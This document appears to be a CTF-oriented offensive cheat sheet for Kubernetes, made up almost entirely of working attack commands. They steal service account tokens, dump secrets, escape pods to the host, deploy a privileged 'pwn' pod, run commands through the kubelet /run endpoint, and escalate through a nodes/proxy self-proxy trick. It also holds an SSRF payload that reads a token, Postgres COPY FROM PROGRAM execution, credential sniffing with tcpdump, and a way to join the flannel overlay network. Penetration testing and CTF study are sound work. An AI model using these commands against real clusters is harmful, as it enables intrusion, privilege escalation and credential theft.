# Kubernetes

## Fingerprint

```text
KUBERNETES_SERVICE_HOST
KUBERNETES_SERVICE_PORT
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
kubectl
```

## Service Account Token

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api"
```

Token is a JWT. Decode the payload to see namespace, service account, and audience:

```bash
cut -d. -f2 "$TOKEN" | base64 -d 2>/dev/null | jq
```

## RBAC

```bash
kubectl auth can-i --list
kubectl auth can-i '*' '*'
kubectl get clusterrolebindings -o wide
kubectl get rolebindings -A
kubectl get roles -A
kubectl get clusterroles
```

Interesting permissions:

```text
get/list/watch secrets
get/list pods
create pods
create pods/exec
create pods/attach
create serviceaccounts/token
impersonate users / groups / serviceaccounts
escalate / bind on roles or clusterroles
```

## Secrets

```bash
kubectl get secrets -A
kubectl get secret NAME -o yaml
kubectl get secret NAME -o jsonpath='{.data.password}' | base64 -d
kubectl get secret NAME -o jsonpath='{.data}' | jq 'map_values(@base64d)'
```

Secret types often contain cloud credentials, registry tokens, TLS keys, and app config.

## Pod Enumeration

```bash
kubectl get pods -A -o wide
kubectl describe pod POD -n NS
kubectl get pod POD -n NS -o yaml
kubectl exec -it POD -n NS -- /bin/sh
kubectl logs POD -n NS
```

Check:

```text
env
envFrom
volumes
serviceAccountName
hostNetwork
hostPID
hostPath
securityContext.privileged
imagePullSecrets
```

## Pod Escape

```bash
# privileged pod
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh

# hostPath mounted
ls /host
chroot /host /bin/sh

# docker socket
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# containerd socket
ctr -a /run/containerd/containerd.sock -n k8s.io containers list

# host filesystem via /proc
cat /proc/1/root/etc/shadow
```

A privileged pod manifest:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  hostNetwork: true
  hostPID: true
  containers:
    - name: pwn
      image: alpine
      command: ["/bin/sh", "-c", "sleep 3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
```

## Cloud Identity From Pods

```text
AWS EKS IRSA / Pod Identity  -> AWS_CONTAINER_CREDENTIALS_FULL_URI
GCP GKE Workload Identity    -> metadata.google.internal
Azure AKS Workload Identity  -> 169.254.169.254/metadata/identity
```

The node may also expose its own identity. Try metadata from inside the pod, but remember some clusters block link-local metadata with a hop limit of 1.

## Kubelet

```bash
curl -k https://NODE:10250/pods
curl -k https://NODE:10250/metrics
curl -k https://NODE:10250/run/NAMESPACE/POD/CONTAINER -d 'cmd=id'
curl -k https://NODE:10255/pods
```

Kubelet anonymous auth or a leaked token can expose pod specs and exec.

## nodes/proxy Self-Proxy

`nodes/proxy` lets the API server proxy a request to a node. Combined with `nodes/status` patch, it can be turned into an API-server-as-cluster-admin primitive.

Check the real call, not only `auth can-i`:

```bash
kubectl auth can-i get nodes/proxy
kubectl get --raw "/api/v1/nodes/NODE/proxy/healthz"
```

If status patching is allowed, point the kubelet port at the API server:

```bash
API=https://KUBE_API:6443
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -sk -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/nodes/NODE/status" > node.json

jq '.status.daemonEndpoints.kubeletEndpoint.port = 6443' node.json > node-patched.json

curl -sk -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/merge-patch+json' \
  -X PATCH -d @node-patched.json \
  "$API/api/v1/nodes/NODE/status"
```

Then use the proxy path. The API server connects to itself with its own credentials:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/nodes/NODE/proxy/api/v1/secrets"

curl -sk -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/nodes/NODE/proxy/api/v1/namespaces/kube-system/secrets/flag"
```

Restore the port when finished. A failed patch can break the node's kubelet route.

## Service Account Token Secret

Creating a secret of type `kubernetes.io/service-account-token` causes the controller to populate it with a valid token for the named service account:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -X POST "$API/api/v1/namespaces/NS/secrets" \
  -d '{
    "apiVersion": "v1",
    "kind": "Secret",
    "metadata": {
      "name": "pwn-token",
      "namespace": "NS",
      "annotations": {
        "kubernetes.io/service-account.name": "TARGET_SA"
      }
    },
    "type": "kubernetes.io/service-account-token"
  }'

kubectl get secret pwn-token -n NS -o jsonpath='{.data.token}' | base64 -d
```

This requires `create secrets` in the namespace and is a common way to inherit a more privileged service account.

## Internal Debug Service / SSRF

A debug bridge often wraps kubelet endpoints. Check its source in the image if the registry allows anonymous pull, and test its validation with path traversal:

```bash
curl -s -X POST http://DEBUG_BRIDGE/logs \
  -H 'Content-Type: application/json' \
  -d '{"node_ip":"NODE_IP","namespace":"app/../kube-system",
       "pod":"POD","container":"CONTAINER"}'
```

If a parameter is interpolated into a URL, inject a path and truncate the rest with `#`:

```bash
curl -s -X POST http://DEBUG_BRIDGE/checkpoint \
  -H 'Content-Type: application/json' \
  -d '{"node_ip":"NODE_IP:10250/run/NS/POD/CONTAINER?cmd=id#",
       "pod":"x","namespace":"x","container":"x"}'
```

The kubelet `/run` endpoint needs `cmd=`; URL-encode spaces and shell metacharacters:

```bash
curl -s -X POST http://DEBUG_BRIDGE/checkpoint \
  -H 'Content-Type: application/json' \
  -d '{"node_ip":"NODE_IP:10250/run/NS/POD/CONTAINER?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token#",
       "pod":"x","namespace":"x","container":"x"}'
```

## Container Breakout via Host Block Device

A privileged or root container may see the host's block devices even without `CAP_SYS_ADMIN`:

```bash
lsblk
ls -la /dev/vd* /dev/sd* 2>/dev/null
cat /proc/self/status | grep CapEff
```

If `sudo` is available without a password, mount the host disk:

```bash
sudo -n id
sudo -n mkdir -p /tmp/host
sudo -n mount /dev/vda /tmp/host
sudo -n cat /tmp/host/flag
```

### Postgres `COPY FROM PROGRAM`

`COPY ... FROM PROGRAM` runs a shell command as the database server user, but requires superuser or a role with `pg_execute_server_program`:

```bash
psql -h DB_HOST -U USER -d DB
```

```sql
CREATE TABLE cmdout(line text);
TRUNCATE cmdout;
COPY cmdout FROM PROGRAM 'id';
SELECT * FROM cmdout;
COPY cmdout FROM PROGRAM 'mkdir -p /tmp/host; sudo -n mount /dev/vda /tmp/host';
COPY cmdout FROM PROGRAM 'sudo -n cat /tmp/host/flag';
```

To capture a plaintext PostgreSQL login, sniff the internal connection and wait for a reconnect:

```bash
tcpdump -i eth0 -n -A -s 0 'tcp port 5432' -w /tmp/pg.pcap
python - <<'PY'
import re
data = open('/tmp/pg.pcap','rb').read()
for m in re.finditer(rb'[\x20-\x7e]{4,}', data):
    print(m.group().decode())
PY
```

Look for `user`, `database`, and the password in the startup packet. PostgreSQL does not re-authenticate on an existing connection, so a capture may only show keepalives until the client reconnects.

## Flannel VXLAN From Outside

With only `get/list nodes`, node annotations may expose enough to join the pod overlay without creating Kubernetes resources:

```bash
kubectl get nodes -o json | jq '.items[] | {
  name,
  podCIDR: .spec.podCIDR,
  underlay: .metadata.annotations["flannel.alpha.coreos.com/public-ip"],
  backend: .metadata.annotations["flannel.alpha.coreos.com/backend-type"],
  data: .metadata.annotations["flannel.alpha.coreos.com/backend-data"]
}'
```

`backend-data` contains the VNI and VTEP MAC:

```json
{"VNI":1,"VtepMAC":"aa:bb:cc:dd:ee:ff"}
```

Create a VXLAN peer with the same VNI and UDP port:

```bash
ip link add flannel.1 type vxlan id 1 dev eth0 dstport 8472 nolearning
ip link set flannel.1 up
ip addr add 10.42.99.0/32 dev flannel.1   # cosmetic source, not used for traffic

bridge fdb append VTEP_MAC dev flannel.1 dst NODE_IP self permanent
ip neigh add POD_CIDR_GATEWAY lladdr VTEP_MAC dev flannel.1
ip route add POD_CIDR via POD_CIDR_GATEWAY dev flannel.1 onlink
```

The return path fails if the node does not know your VTEP MAC. Source the inner packets from the bastion's underlay IP so pod replies leave the node as normal L3 traffic:

```bash
ip route replace POD_CIDR via POD_CIDR_GATEWAY dev flannel.1 onlink src BASTION_UNDERLAY_IP
```

Find the real CoreDNS pod by sweeping pod CIDRs, because the `kube-dns` Service VIP may have no endpoints:

```bash
for ip in 10.42.0.{2..30} 10.42.1.{2..30} 10.42.2.{2..30}; do
  dig @"$ip" cluster.local SOA +short +time=1 +tries=1 2>/dev/null \
    && echo "DNS: $ip"
done
```

Then PTR-sweep the service CIDR and use SRV for the port:

```bash
for i in $(seq 1 254); do
  dig @COREDNS_IP -x 10.43.0.$i +short
done

dig @COREDNS_IP SRV flag-server.target.svc.cluster.local +short
```

Connect to the pod IP directly if the Service VIP path does not work. The overlay is the data plane; RBAC only controls the API.

## CTF Chains

```text
Pod token -> API -> list secrets -> cloud creds -> storage
Pod token -> create privileged pod -> node -> host flag
Pod token -> exec into another pod -> secret
Kubelet 10250 -> exec -> flag
Workload identity -> cloud token -> bucket / vault
Debug bridge SSRF -> kubelet /run -> app SA token -> create SA-token secret -> nodes/proxy -> API secrets
nodes/proxy + nodes/status patch -> API server self-proxy -> cluster-admin
Container -> internal Postgres -> COPY FROM PROGRAM -> host block device -> /flag
get nodes -> flannel annotations -> VXLAN peer -> CoreDNS PTR/SRV -> hidden pod
```

## References

* [Kubernetes RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
* [Kubernetes secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
* [HackTricks Kubernetes](https://book.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html)
* [Peirates](https://github.com/inguardians/peirates)
* [kubeletctl](https://github.com/cyberark/kubeletctl)
* [kube-hunter](https://github.com/aquasecurity/kube-hunter)
